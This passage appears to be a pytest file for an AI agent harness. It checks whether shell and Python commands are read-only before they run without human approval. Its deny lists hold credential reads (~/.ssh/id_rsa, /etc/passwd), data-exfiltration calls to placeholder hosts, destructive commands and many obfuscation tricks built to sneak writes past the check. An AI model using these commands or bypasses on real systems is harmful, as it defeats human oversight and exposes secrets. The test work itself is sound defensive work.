"""Whether a call of a framework's own shell only reads (``governance.shell.read_only``): what
the harness lets Claude Code and Kimi Code run without asking a person; and, given a working
folder, whether its every write lands there (``approvable``: the benchmark's reviewer)."""

from __future__ import annotations

import importlib.util
import inspect
import os
import shutil
from pathlib import Path

import pytest

from trellis.harness.governance import shell
from trellis.harness.governance.shell import approvable, read_only

#: The standard library's own: the tests below stand in another for it.
WHICH = shutil.which


def py(code: str) -> str:
    """``code`` as the Python a shell command runs (a heredoc: no quoting to read through)."""
    return f"python3 - <<'EOF'\n{code}\nEOF"


@pytest.fixture(autouse=True)
def _a_machine_of_its_own(monkeypatch: pytest.MonkeyPatch) -> None:
    """Every program is found in the system's folder, and nothing is on Python's path: what a
    test says of a command does not depend on the machine it runs on."""
    for variable in ("PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME"):
        monkeypatch.delenv(variable, raising=False)
    monkeypatch.setattr(shell.shutil, "which", lambda name, path=None: f"/usr/bin/{name}")


@pytest.fixture
def run(tmp_path: Path) -> Path:
    """The run's working folder (``@RUN`` in a command), beside a folder the harness lets it
    read (``@KEPT``)."""
    (tmp_path / "run").mkdir()
    (tmp_path / "kept").mkdir()
    return tmp_path / "run"


def reads(command: str, run: Path) -> bool:
    """Whether ``command`` is read-only run in ``run``, the folder beside it readable too."""
    kept = run.parent / "kept"
    command = command.replace("@RUN", str(run)).replace("@KEPT", str(kept))
    return read_only("Bash", {"command": command}, run, [kept])


READS = [
    "cat sales.csv | head -50",
    "wc -l sales.csv && head -3 sales.csv",
    "grep -c denim sales.csv; sort -t, -k3 -n sales.csv | tail -5",
    "awk -F, '{s+=$4} END {print s}' sales.csv",
    "sed -n '2,10p' sales.csv",
    "find . -name '*.csv'",
    """python3 -c "import csv; print(sum(float(r['revenue']) for r in csv.DictReader(open('s.csv'))))\"""",
    "python3 - <<'EOF'\nimport pandas as pd\ndf = pd.read_csv('s.csv')\nprint(df['revenue'].sum())\nEOF",
    "python3 <<EOF\nwith open('s.csv', 'rb') as f:\n    print(len(f.read()))\nEOF",
    # Kimi's, in the re-measure on Haiku: a newline inside the quoted code, an error output
    # joined to the output (``2>&1``), ``which``
    'python3 -c "\nr=25333.51\nn=r*0.9*1.15\nprint(round(n,2), round(n-r,2))"',
    'python3 -c "import matplotlib, sys; print(matplotlib.__version__, sys.version)" 2>&1; which python3',
    'python3 -c "import matplotlib; print(matplotlib.__version__)" 2>&1; which python3; pwd; ls -la',
    "ls -la 2>&1 | head -5",
    # Kimi's, run with the fixes: an error output thrown away
    "which gnuplot convert magick 2>/dev/null; pwd",
    "ls -la x > /dev/null && echo found",
    # Kimi's, in the natural re-measure: a cd first (into a folder the run may read)
    "cd @RUN && ls -l && head -3 s.csv && wc -l data/s.csv",
    # Claude's, on the long set: a string's replace is no file's (os.replace, Path.replace)
    "cd @KEPT && python3 -c \"\nimport json\nt=json.load(open('a.json'))[0]['text']\n"
    "print('tail:', t[10:310].replace(chr(10),' ')[:300])\n\"",
    """python3 -c "name = 'Trail Sandal'; print(name.replace(' ', '_'))\"""",
    """python3 -c "print(open('s.csv').read().replace(',', ';', 3))\"""",
    """python3 -c "v = 'a b'; d = {}; d['k'] = v; print(d['k'].replace(' ', '_'))\"""",
    # what the proof still reads: the listed modules by their listed names, a value's listed methods
    py(
        "import os, sys, glob\nfor f in sorted(glob.glob('*.csv')):\n    print(f, os.path.getsize(f))"
    ),
    py("from os import path\nfrom os.path import join as j\nprint(path.exists(j('a', 'b')))"),
    py("import os.path as osp, numpy.linalg\nprint(osp.isdir('.'), numpy.linalg.norm([3, 4]))"),
    py("import os.path\nprint(os.path.basename('a/b'), os.sep)"),
    py(
        "import json, re, math, statistics, datetime, collections, itertools, csv, string, textwrap"
    ),
    py(
        "from pathlib import Path\nprint(Path('s.csv').name, Path('s.csv').stat().st_size, Path('.').exists())"
    ),
    py(
        "import os, glob\nprint(os.listdir(), os.listdir('data'), glob.glob('**/*.csv', recursive=True))"
    ),
    py("import json\nprint(json.load(open('@KEPT/a.json')), open('@RUN/s.csv').read())"),
    # a folder the harness lets the run read (the skills it wrote for it)
    "cat @KEPT/skills/stock-cover/SKILL.md | head -40",
    "ls -la @KEPT && grep -rn cover @KEPT/skills --include=*.md",
    "diff s.csv --to-file=@KEPT/a.csv",
    "grep -e total -e sum s.csv | head; rg --files; rg -n total src",
    py("from pathlib import Path\nprint(Path('a.txt').open().read(), Path('b').open(mode='rb'))"),
    py(
        "import pandas as pd\npd.set_option('display.max_columns', None)\n"
        "df = pd.read_csv('s.csv')\nprint(df.head().to_string(), df.describe().to_markdown(index=False))"
    ),
    py(
        "import pandas as pd\ndf = pd.read_csv(open('s.csv'))\ng = df.groupby('region')\n"
        "print(g.agg({'revenue': ['sum', 'mean']}), g.agg(total=('revenue', 'sum'), n=('units', len)))"
    ),
    py(
        "import pandas as pd, numpy as np\ndf = pd.read_excel('s.xlsx')\ndef band(v):\n    return v // 10\n"
        "print(df['units'].apply(band), df['units'].apply(lambda v: v * 2), df.agg(np.mean), df.agg(max))"
    ),
    py("from numpy import mean\nimport pandas as pd\nprint(pd.read_csv('s.csv').agg(mean))"),
    py(
        "import numpy as np\na = np.loadtxt('s.txt')\nprint(a.mean(), np.percentile(a, 90), a.shape)"
    ),
    py(
        "from collections import Counter\nfrom datetime import datetime\n"
        "c = Counter(open('s.csv').read().split())\nprint(c.most_common(3), datetime.now().isoformat())"
    ),
    py(
        "import json\nd = json.load(open('a.json'))\nprint(type(d), f'{type(d)}', type(d).__name__, len(d))"
    ),
    py(
        "import io, gzip\nprint(io.open('a.txt', 'r').read(), gzip.open('a.gz', 'rt', encoding='utf-8').read())"
    ),
    py("import matplotlib\nprint(matplotlib.__version__, __name__, matplotlib.__doc__)"),
    py(
        "import openpyxl\nws = openpyxl.load_workbook('q3.xlsx').active\n"
        "for row in ws.iter_rows(values_only=True):\n    print(row)"
    ),
    py(
        "class Total:\n    def add(self, v):\n        self.value = v\n        return self\n"
        "try:\n    print(Total().add(1).value)\nexcept ValueError as e:\n    print(e.args)"
    ),
    # the shell: sed and awk that only print, a comment, an option among others that writes nothing
    "sed -n -e '1p' -e '$p' s.csv",
    "sed -ne '/denim/p;5q' s.csv",
    "sed -E 's/[0-9]+/N/g; s|a|b|2' s.csv",
    "awk -F , -v n=3 'NR <= n {print $1}' s.csv",
    "sort -t, -k2,2nr s.csv | uniq -c | sort -rn",
    "uniq -c s.csv",  # one file: the one it reads
    "/usr/bin/wc -l s.csv",
    "echo a#b  # a comment",
    """grep "total$" s.csv | cut -d, -f2 ; echo a\\ b "it's \\$5" '{$x}' "{a,b}" $""",
    # each program whose words are texts, not files to read
    "printf '%s\\n' /etc/passwd",
    "true /etc/passwd",
    "basename /etc/passwd",
    "dirname /etc/passwd",
    # each program whose first word is a script or a pattern, and the options that take a value
    "grep /etc/ notes.txt",
    "egrep /etc/ notes.txt",
    "rg /etc/ notes.txt",
    "jq /etc/ a.json",
    "awk /etc/ a.csv",
    "sed -n /etc/p a.csv",
    "awk -F / '{print $1}' a.csv",
    "awk -v x=/etc/ '{print x}' a.csv",
    "cat a.csv || true",
    'python -c "print(1)"',
    # each name and method Python may read, each reader of a path written out
    'python3 -c "import pandas as pd; print(pd.__version__, pd.__name__, pd.__file__, pd.__doc__)"',
    'python3 -c "import pandas as pd; d = pd.DataFrame(); print(d.to_string(), d.to_markdown())"',
    'python3 -c "import pandas as pd; d = pd.DataFrame(); print(d.to_html(), d.to_latex())"',
    "python3 -c \"import pandas as pd; pd.read_csv('a.csv'); pd.read_excel('a.xlsx')\"",
    "python3 -c \"import pandas as pd; pd.read_json('a.json'); pd.read_table('a.tsv')\"",
    "python3 -c \"import pandas as pd; pd.read_parquet('a.pq'); pd.read_fwf('a.txt')\"",
    "python3 -c \"import pandas as pd; pd.ExcelFile('a.xlsx')\"",
    "python3 -c \"import numpy as np; np.loadtxt('a.csv'); np.genfromtxt('a.csv')\"",
    "python3 -c \"import os; os.listdir('.'); os.walk('.'); os.scandir('.')\"",
    "python3 -c \"import glob, openpyxl; glob.glob('*.csv'); glob.iglob('*'); openpyxl.load_workbook('a.xlsx')\"",
    "python3 -c \"import pandas as pd; pd.set_option('display.max_rows', 5); pd.option_context('display.width', 80)\"",
    "python3 -c \"import pandas as pd; d = pd.DataFrame(); d.apply(lambda r: r); d.agg('sum')\"",
    "python3 -c \"import pandas as pd; d = pd.DataFrame(); d.aggregate('mean'); d.transform(lambda x: x)\"",
]
NOT = [
    "rm -rf /tmp/x",
    "cat a.csv > b.csv",
    "echo hi >> notes.txt",
    "sort -o out.csv in.csv",
    "sed -i 's/a/b/' sales.csv",
    "sed 's/a/b/w out.txt' sales.csv",
    "find . -name '*.csv' -delete",
    "find . -exec rm {} ;",
    "awk '{print > \"out.txt\"}' s.csv",
    "curl https://example.com",
    "pip install statsmodels",
    "python3 forecast.py",
    "python3 -c \"import pandas as pd; pd.read_csv('s.csv').to_excel('q3.xlsx')\"",
    "python3 -c \"open('out.txt', 'w').write('x')\"",
    "python3 -c \"import subprocess; subprocess.run(['ls'])\"",
    "python3 -c \"import os; os.remove('s.csv')\"",
    # a replace that moves a file: os's (by any name the module has), a Path's (one argument)
    "python3 -c \"import os; os.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os as o; o.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os; o = os; p = o; p.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os\nif (o := os):\n    o.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os, sys; sys.modules['os'].replace('s.csv', 'old.csv')\"",
    "python3 -c \"from os import replace; replace('s.csv', 'old.csv')\"",
    "python3 -c \"from pathlib import Path; Path('s.csv').replace('old.csv')\"",
    "python3 -c \"from pathlib import Path; p = Path('s.csv'); p.replace(target='old.csv')\"",
    "python3 -c 'import matplotlib.pyplot as plt; plt.savefig(\"c.png\")'",
    "python3 -c 'syntax error('",
    "cat $(ls)",
    "cat `ls`",
    "sleep 100 &",
    "X=1 cat s.csv",
    "cat 's.csv",
    "",
    "cat s.csv\nrm s.csv",  # a newline between commands: the second one is read too
    "ls 2>&1 > out.txt",
    "ls 2>errors.txt",
    "which python3 > where.txt",
    "ls 2>/dev/null.txt",
    "ls > /dev/sda",
    "cat <<'EOF'\nhello\nEOF",  # a heredoc to anything but Python is not read here
    "cd /data && rm sales.csv",
    "cd && ls",
    # ---- a function that writes, reached without calling it by its name (all read-only on main)
    py("import os\nf = os.remove\nf('s.csv')"),
    py("from os import remove as r\nr('s.csv')"),
    py("import os\ngetattr(os, 'remove')('s.csv')"),
    py("import os\ngetattr(os, 're' + 'move')('s.csv')"),
    py("from pathlib import Path\nu = Path.unlink\nu(Path('s.csv'))"),
    py("import os\n{'x': os.remove}['x']('s.csv')"),
    py("import os\nlist(map(os.remove, ['s.csv']))"),
    # ---- a module held another way, its replace (a file's move) read as a text's (PR #208's)
    py("import os\n(lambda m: m.replace('s.csv', 'old.csv'))(os)"),
    py("import os\ndef f(m):\n    m.replace('s.csv', 'old.csv')\nf(os)"),
    py("import os\nfor m in [os]:\n    m.replace('s.csv', 'old.csv')"),
    py("import os\nm, n = os, 1\nm.replace('s.csv', 'old.csv')"),
    py("import os\nclass K:\n    m = os\nK.m.replace('s.csv', 'old.csv')"),
    py("import os\nd = {'m': os}\nd['m'].replace('s.csv', 'old.csv')"),
    py("import os\nglobals()['os'].replace('s.csv', 'old.csv')"),
    py("from pathlib import Path\np = Path('s.csv')\ntype(p).replace(p, 'old.csv')"),
    py("import glob\n(lambda m: m.replace('s.csv', 'old.csv'))(glob.os)"),
    # ---- further ways round: each writes, moves, deletes, runs a program or sends
    py("import os\nos.renames('s.csv', 'old.csv')"),  # a writer main's list of names never had
    py("import os\nos.execv('/bin/rm', ['rm', 's.csv'])"),
    py("import os\nos.open('s.csv', flags=os.O_WRONLY | os.O_TRUNC)"),
    py("import os\nos.environ['MPLBACKEND'] = 'module://x'"),
    py("import os\nos.chdir('/etc')"),
    py("from os import *\nremove('s.csv')"),
    py("from . import os"),
    py("import os as o, os.path as o"),
    py("import os\nfrom os import path as os"),
    py("from os import path\nfrom os.path import join as path"),
    py("from os.path import join\nfrom os import path as join"),
    py("from os.path import join\nfrom os.path import split as join"),
    py("import os\nx = os.path\nprint(x.os.remove('s.csv'))"),
    py("import os\nos.path.os.remove('s.csv')"),
    py("import os\nos.path.exists = print"),
    py("import os\nos.sep = '!'"),
    py("import json\njson.codecs.open('s.csv', 'w')"),
    py("import statistics\nstatistics.sys.modules['os'].remove('s.csv')"),
    py("import sys\nsys.modules['os'].remove('s.csv')"),
    py("import sys\nsys.path.insert(0, '/tmp/x')\nimport json"),
    py("import builtins\nbuiltins.open('s.csv', 'w')"),
    py("import importlib\nimportlib.import_module('os').remove('s.csv')"),
    py("import ctypes\nctypes.CDLL(None).unlink(b's.csv')"),
    py("import operator\noperator.attrgetter('remove')"),
    py("import operator, os\noperator.methodcaller('remove', 's.csv')(os)"),
    py("import string\nstring.Formatter().get_field('0.gi_frame', [(x for x in [])], {})"),
    py("import pickle\npickle.load(open('x.pkl', 'rb'))"),
    py("import zipfile\nzipfile.ZipFile('s.csv', 'w')"),
    py("import sqlite3\nsqlite3.connect('new.db')"),
    py("import shelve\nshelve.open('s')"),
    py("import webbrowser\nwebbrowser.open('http://x/?q=secret')"),
    py("import antigravity"),
    py("import tempfile\ntempfile.mkstemp()"),
    py("import logging\nlogging.basicConfig(filename='s.csv', filemode='w')"),
    py("import fileinput\nfor line in fileinput.input('s.csv', inplace=True):\n    pass"),
    py("import socket\nsocket.create_connection(('x', 80)).send(b'secret')"),
    py("import urllib.request\nurllib.request.urlopen('http://x/?q=secret')"),
    py("import asyncio\nasyncio.run(asyncio.create_subprocess_exec('rm', 's.csv'))"),
    py("import multiprocessing\nmultiprocessing.Process(target=print).start()"),
    py("import re\nre.compile('x')"),  # as on main
    py(
        "xs = [1]\nxs.remove(1)\nys = xs.copy()"
    ),  # as on main: the names a file's delete and copy have
    py("print(__builtins__.open)"),
    py("for __builtins__ in []:\n    pass"),
    py("print(__loader__, __spec__)"),
    py("print(().__class__.__base__.__subclasses__())"),
    py("f = lambda: 0\nprint(f.__globals__['__builtins__'])"),
    py("print((x for x in []).gi_frame.f_builtins['exec'])"),
    py("try:\n    1 / 0\nexcept Exception as e:\n    print(e.__traceback__.tb_frame.f_globals)"),
    py("print('{0.__class__}'.format(1)._formatter_parser())"),
    py("print(vars()['x'])"),
    py("print(locals(), dir())"),
    py("eval('1')"),
    py("exec('import os')"),
    py("__import__('os').remove('s.csv')"),
    py("compile('1', 'f', 'eval')"),
    py("x = input()"),
    py("breakpoint()"),
    py("print(undefined_name)"),
    # a built-in's name the code sets later is still the built-in until then
    py("eval('1')\neval = 1"),
    py("getattr(1, 'real')\ndef getattr(a, b):\n    return 0"),
    py("x = vars\nfor vars in []:\n    pass"),
    py("import json as getattr"),
    py("from json import loads as exec"),
    # open: kept, passed, or given its mode a way the text does not show
    py("o = open\no('s.csv', 'w')"),
    py("list(map(open, ['s.csv'], ['w']))"),
    py("import functools\nfunctools.partial(open, mode='w')('s.csv')"),
    py("open(*['s.csv', 'w'])"),
    py("open('s.csv', **{'mode': 'w'})"),
    py("m = 'w'\nopen('s.csv', m)"),
    py("open('s.csv', 'r+')"),
    py("open('s.csv', 'a')"),
    py("open(file='s.csv', mode='w')"),
    py("open('s.csv', 'r', -1, None, None, None, True, print)"),
    py("open('s.csv', opener=print)"),
    py("from pathlib import Path\nPath('s.csv').open('w')"),
    py("from pathlib import Path\nPath('s.csv').open(mode='w')"),
    py("from pathlib import Path\nPath.open(Path('s.csv'), 'w')"),
    py("import io\nio.open('s.csv', 'w')"),
    py("from io import open as o\no('s.csv', 'w')"),
    py("import io\nio.FileIO('s.csv', 'w')"),
    py(
        "print(type(open('a', 'rb', buffering=0))('s.csv', 'w'))"
    ),  # the class of a raw file opens one
    py("t = type(1)"),
    py("print = lambda c: c('s.csv', 'w')\nprint(type(open('a', 'rb', buffering=0)))"),
    py("print(type(1, 2))"),
    py("print(type(*[1]))"),
    # a text's replace, when the code could hold a Path - or keeps the method
    py("from pathlib import Path\nPath.replace(Path('s.csv'), 'old.csv')"),
    py("import pathlib\npathlib.Path.replace(pathlib.Path('s.csv'), 'old.csv')"),
    py(
        "from pathlib import Path\nprint(Path('a b').name.replace(' ', '_'))"
    ),  # the cost: not proven
    py("from pathlib import Path as P\nq = P\nq.replace(q('s.csv'), 'old.csv')"),
    py("from pathlib import PurePath\nr = str.replace\nr('a', 'b', 'c')"),
    py("r = 'a b'.replace\nprint(r(' ', '_'))"),
    py("print('a b'.replace(*[' ', '_']))"),
    py("print('a b'.replace(' ', '_', count=1))"),
    py("import datetime\nprint(datetime.date.today().replace(day=1))"),  # as on main
    # a Path's other writes, a table's and an array's, with and without the name main knew
    py("from pathlib import Path\nPath('a').symlink_to('b')"),
    py("from pathlib import Path\nPath('a').hardlink_to('b')"),
    py("from pathlib import Path\nprint(Path('a').parser.os.remove)"),
    py("from pathlib import Path\nPath('s.csv').write_text('x')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_hdf('s.h5', key='k')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_string('out.txt')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_markdown(buf='out.md')"),
    py("import pandas as pd\nf = pd.read_csv('s.csv').to_string\nf('out.txt')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_clipboard()"),
    py("import pandas as pd\npd.read_csv('s.csv').agg('to_csv', 0, 'out.csv')"),
    py("import pandas as pd\nf = 'to_csv'\npd.read_csv('s.csv').agg(f, 0, 'out.csv')"),
    py("import pandas as pd\npd.read_csv('s.csv').apply('to_pickle', args=('x.pkl',))"),
    py("import pandas as pd\npd.read_csv('s.csv').agg(['sum', 'to_csv'])"),
    py("import pandas as pd\npd.read_csv('s.csv').agg({'a': 'to_csv'})"),
    py("import pandas as pd\npd.read_csv('s.csv').groupby('a').agg(x=('b', 'to_csv'))"),
    py("import pandas as pd\npd.read_csv('s.csv').agg()"),
    py("import pandas as pd\npd.read_csv('s.csv').agg(*['to_csv'])"),
    py("import pandas as pd\nlen = 'to_csv'\npd.read_csv('s.csv').agg(len, 0, 'out.csv')"),
    py(
        "import pandas as pd\ndef f(v):\n    return v\nf = 'to_csv'\npd.read_csv('s.csv').agg(f, 0, 'o.csv')"
    ),
    py(
        "import pandas as pd\ndef name(g):\n    return 'to_csv'\n@name\ndef f(v):\n    return v\n"
        "pd.read_csv('s.csv').agg(f, 0, 'o.csv')"
    ),
    py("\uff45\uff56\uff41\uff4c('1')"),  # wide letters: Python reads them as eval
    "python -c \"execfile('x.py'); execfile = 1\"",  # Python 2's built-in, where python is one
    py("import pandas as pd\nprint(pd.read_csv('s.csv').query('@os.remove(\"s.csv\")'))"),
    py("import pandas as pd\npd.eval('1')"),
    py("import pandas as pd\npd.io.common.os.remove('s.csv')"),
    py("import pandas as pd\npd.read_pickle('x.pkl')"),
    py("import pandas as pd\npd.read_csv('https://x/?q=secret')"),
    py("import pandas as pd\nu = 'https://x/?q=secret'\npd.read_csv(u)"),
    py("import pandas as pd\npd.read_csv()"),
    py("import pandas as pd\nr = pd.read_csv\nr('https://x/?q=secret')"),
    py("from pandas import read_csv as r\nx = r\nx('https://x/?q=secret')"),
    py("import pandas as pd\nopen = lambda: 'https://x/?q=secret'\npd.read_csv(open())"),
    py("import pandas as pd\npd.set_option('display.x|plotting.backend', 'antigravity')"),
    py("import pandas as pd\npd.set_option('plotting.backend', 'antigravity')"),
    py("import pandas as pd\npd.set_option(**{'pat': 'plotting.backend', 'value': 'x'})"),
    py("import pandas as pd\npd.read_csv('s.csv').plot(backend='antigravity')"),
    py(
        "import pandas as pd\npd.read_csv('s.csv').plot()"
    ),  # draws: of use only to save, in the folder
    py(
        "import pandas as pd\npd.read_csv('s.csv').hist(None, None, True, None, None, None, None, None, "
        "False, False, None, None, 10, 'antigravity')"
    ),
    py(
        "import pandas as pd\nprint(pd.read_csv('s.csv').revenue)"
    ),  # the cost: a column read as an attribute
    py("import numpy as np\nnp.array([1]).tofile('s.csv')"),
    py("import numpy as np\nnp.savetxt('s.csv', [1])"),
    py("import numpy as np\nnp.load('x.npy', allow_pickle=True)"),
    py("import numpy as np\nnp.loadtxt('https://x/s.txt')"),
    py("import numpy as np\nprint(np.array([1]).ctypes.data)"),
    py("import numpy as np\nnp.memmap('s.csv', mode='w+', shape=(1,))"),
    py("import matplotlib\nmatplotlib.use('module://antigravity')"),
    py("import matplotlib\nmatplotlib.use('Agg', force=True)"),
    py("import matplotlib\nmatplotlib.rcParams['backend'] = 'module://antigravity'"),
    py("import matplotlib.pyplot as plt\nplt.plot([1])"),
    py("from matplotlib import pyplot"),
    py("import openpyxl\nopenpyxl.Workbook(write_only=True)"),
    py("import openpyxl\nopenpyxl.Workbook(True)"),
    py("import yaml\nyaml.load(open('a.yaml'), Loader=yaml.Loader)"),
    py("import json, sys\njson.dump({}, sys.stdout)"),  # a write to a handle: as on main
    py("import sys\nsys.stdout.write('x')"),
    py("import csv, sys\nw = csv.writer(sys.stdout).writerow\nprint(w.__self__)"),
    py("match 1:\n    case int(real=r):\n        print(r)"),
    py("def f(**k):\n    return k\nf(**{'a': 1})"),
    py("print(x := 1, y)"),
    py("import os\n[m.replace('s.csv', 'old.csv') for m in (os,)]"),
    py("import os\n(m for m in [os])"),
    py("import os\ndef f(m=os):\n    return m.replace('s.csv', 'old.csv')"),
    py("import os\n@os\ndef f():\n    pass"),
    py("import os\nwith os as m:\n    pass"),
    py("import os\nif (m := os):\n    pass"),
    py("import os\n*m, = [os]"),
    py("import os\nprint(f'{os.remove}')"),
    py("import os\nprint(f'{os!r:>{os.replace}}')"),
    py("import os\nos = 1"),
    py("import os\ndef os():\n    pass"),
    py("import os\ntry:\n    pass\nexcept Exception as os:\n    pass"),
    py("import os\ndel os"),
    py("import os\nf = lambda os: os.listdir('.')"),
    py("import os\nclass os:\n    pass"),
    py("import os\nos.listdir(b'.')[0].decode().__class__"),
    # ---- the shell: read another way by the shell than by the check (all read-only on main)
    "echo a#b ; rm x",  # no comment mid-word: the shell runs the rm
    "echo $'\\'' ; rm x ; echo \\'",  # $'...' ends where shlex reads on
    'echo $"hi"',
    'python3 <<EOF\nprint("$(rm x)")\nEOF',  # an unquoted heredoc: the shell expands it first
    "python3 <<EOF\nprint('`rm x`')\nEOF",
    "python3 <<EOF\na = '\\\\'; b = ' ;import os;os.remove(\"x\") #'\nEOF",  # and drops a backslash
    "python3 <<'EOF'\nEOF = reboot = 0\nEOF\nreboot\nEOF",  # the body ends at the first EOF
    "./python3 <<'EOF'\nprint(1)\nEOF",
    "sort {-o,out.csv} in.csv",  # the shell makes the braces two words: -o out.csv
    "echo -delete ; find . $_",  # the last word of the command before: find . -delete
    """echo "';import os;os.remove('s.csv');'" ; python3 -c "x = '$_'\"""",
    'cat "$HOME/s.csv"',
    "cat ${HOME}/s.csv",
    "echo $[1+1] $1 $@ $? $$",
    "./cat s.csv",  # a file of the folder, named as a reader
    "bin/ls",
    # sed, awk and the readers: an option or a command main read past
    "sed -ni 's/a/b/' s.csv",
    "sed -Ei 's/a/b/' s.csv",
    "sed --in-place 's/a/b/' s.csv",
    "sed 's/a/b/gw out.txt' s.csv",
    "sed -n '1w out.txt' s.csv",
    "sed 's|a|b|e' s.csv",
    "sed -n -e p -e 'w out.txt' s.csv",
    "sed -f script.sed s.csv",
    "sed -n s.csv -e",
    "sed -n",
    "sed '1e rm x' s.csv",
    "awk 'BEGIN{system (\"rm x\")}'",
    "awk -i inplace '{print}' s.csv",
    "awk -f prog.awk s.csv",
    "awk 'BEGIN{getline x < \"/inet/tcp/0/x/80\"}'",
    "awk '@include \"x\"'",
    "awk '{print | \"sh\"}' s.csv",
    "sort -no out.csv in.csv",
    "sort --compress-program=rm s.csv",
    "uniq in.csv out.csv",
    "rg --pre rm x",
    "rg -uz total logs",  # runs a program to unpack what it searches
    "file -z a.gz",
    "file -C -m magic",
    "date -s 2020-01-01",
    # programs that are no readers, and the shell's own ways to run one
    "find . -fprintf out.txt %p",
    "xargs rm",
    "cat s.csv | tee out.csv",
    "dd if=a of=b",
    "env X=1 rm x",
    "sh -c 'rm x'",
    "bash -c 'rm x'",
    "perl -e 'unlink \"x\"'",
    'node -e \'require("fs").unlinkSync("x")\'',
    "ruby -e 'File.delete(\"x\")'",
    "git clean -fd",
    "git checkout -- s.csv",
    "curl -X POST -d @s.csv https://example.com",
    "curl -o page.html https://example.com",
    "wget https://example.com",
    "tar -xf a.tar",
    "unzip a.zip",
    "chmod 777 s.csv",
    "ln -s a b",
    "(rm x)",
    "cat <(rm x)",
    "ls |& tee x",
    "echo x >& out.txt",
    "cat <<< x",
    "eval rm x",
    "exec rm x",
    "command rm x",
    "time rm x",
    # each reader that also fetches an address, given one
    *(
        f"python3 -c \"import pandas as pd; pd.{reader}('https://x.test/a')\""
        for reader in ("read_csv", "read_excel", "read_json", "read_table", "read_parquet")
    ),
    *(
        f"python3 -c \"import pandas as pd; pd.{reader}('https://x.test/a')\""
        for reader in ("read_fwf", "ExcelFile")
    ),
    "python3 -c \"import numpy as np; np.loadtxt('https://x.test/a')\"",
    "python3 -c \"import numpy as np; np.genfromtxt('https://x.test/a')\"",
    # each function that lists a folder, given one the run may not read
    *(f"python3 -c \"import os; os.{f}('/etc')\"" for f in ("listdir", "walk", "scandir")),
    *(f"python3 -c \"import glob; glob.{f}('/etc/*')\"" for f in ("glob", "iglob")),
    "python3 -c \"import openpyxl; openpyxl.load_workbook('/etc/a.xlsx')\"",
    # an option that is not how a table is shown; a function applied that is not listed
    "python3 -c \"import pandas as pd; pd.set_option('io.excel.xlsx.writer', 'x')\"",
    "python3 -c \"import pandas as pd; pd.option_context('io.excel.xlsx.writer', 'x')\"",
    *(
        f'python3 -c "import os, pandas as pd; pd.DataFrame().{f}(os.system)"'
        for f in ("apply", "agg", "aggregate", "transform")
    ),
]


@pytest.mark.parametrize("command", READS)
def test_a_command_that_only_reads_is_approved(command: str, run: Path) -> None:
    assert reads(command, run)


@pytest.mark.parametrize("command", NOT)
def test_a_command_that_may_write_or_cannot_be_read_stays_a_pause(command: str, run: Path) -> None:
    assert not reads(command, run)


# --------------------------------------------------------------------------- reads outside the run's folder
#: What changes nothing, but reads what the machine keeps - a file outside the run's folder
#: and the folders the harness lets it read, the environment - or reads a file the command
#: does not name: a pause, in the run's folder too (all read-only before).
ELSEWHERE = [
    "cat /etc/passwd",
    "cat ~/.ssh/id_rsa",
    "cat /proc/self/environ",
    "head -3 ../other/s.csv",
    "tail -1 data/../../x",
    "ls /",
    "ls ..",
    "ls -la ~",
    "cd /etc && cat passwd",
    "cd .. && ls",
    "cd @KEPT/.. && ls",
    "grep -r key /home",
    "grep key s.csv /etc/passwd",
    "grep /etc/passwd -e root",  # the pattern is the option's: the first word is a file
    "grep -ie root /etc/passwd",
    "grep --regexp=root /etc/passwd",
    "rg --files /etc",
    "cd - && cat passwd",
    "find / -name id_rsa",
    "find . -newer /etc/passwd",
    "wc -l --include=/etc/passwd",
    "wc -l --files0-from=list",
    "sort --files0-from=list",
    "du --files0-from=list",
    "file -f list",
    "date -f dates",
    "find -files0-from list",
    "grep -f /etc/passwd s.csv",
    "grep --file=/etc/passwd s.csv",
    "grep --file pats s.csv",
    "grep -R key .",
    "rg -L key",
    "rg -f pats",
    "jq -n env",
    "jq '$ENV.HOME' a.json",
    "jq -n 'import \"x\" as $x; $x'",
    "jq -f prog.jq a.json",
    "jq -L lib .a a.json",
    "jq .a /etc/x.json",
    "awk 'BEGIN{print ENVIRON[\"HOME\"]}'",
    "awk 'BEGIN{ARGV[1]=\"/etc/passwd\";ARGC=2} {print}'",
    "awk '{print}' /etc/passwd",
    "sed -n 1p /etc/passwd",
    "sed -n -e 1p /etc/passwd",
    "diff s.csv --to-file=/etc/passwd",
    "ls -l /large_tool_results/3dfef05",  # Kimi's: a kept result's name is no file of the machine
    "printenv",
    "env",
    "/tmp/ls",  # a program is one of the system's
    "/opt/tools/cat s.csv",
    "@RUN/cat s.csv",
    "bin/python3 -c 'print(1)'",
    py("print(open('/etc/passwd').read())"),
    py("print(open('../x').read())"),
    py("print(open('~/.ssh/id_rsa').read())"),
    py("f = 's.csv'\nprint(open(f).read())"),  # the cost: a path not written out
    py("print(open())"),
    py("import io, gzip\nprint(io.open('/etc/passwd'), gzip.open('/var/log/x.gz'))"),
    py("import pandas as pd\nprint(pd.read_csv('/etc/passwd'))"),
    py("import openpyxl\nprint(openpyxl.load_workbook('/etc/x.xlsx'))"),
    py("import os\nprint(os.listdir('/'))"),
    py("import os\nprint(os.listdir('..'))"),
    py("import os\nprint(list(os.walk('/home')))"),
    py("import os\nd = '/'\nprint(os.listdir(d))"),
    py("import glob\nprint(glob.glob('/etc/*'))"),
    py("import glob\nprint(glob.glob('*', root_dir='/etc'))"),
    py("import os\nprint(os.getenv('HOME'))"),
    py("from pathlib import Path\nprint(Path('/etc/passwd').read_text())"),
    py("from pathlib import Path\np = Path('s.csv')\nprint((p / '../../etc/passwd').read_text())"),
    py("from pathlib import Path\nprint(Path('.').parent.parent)"),
    py("from pathlib import Path\nprint(Path.home(), Path.cwd())"),
    py("from pathlib import Path\nprint(Path('a', '/etc/passwd').read_text())"),
    py("from pathlib import Path\nprint(Path('s.csv', x=1))"),
    py("from pathlib import Path\nfor q in Path('.').glob('*.csv'):\n    print(q.read_text())"),
    py("from pathlib import Path\nprint(Path('.').resolve())"),
    py("from pathlib import PurePath"),
]


@pytest.mark.parametrize("command", ELSEWHERE)
def test_a_read_outside_what_the_run_may_read_stays_a_pause(command: str, run: Path) -> None:
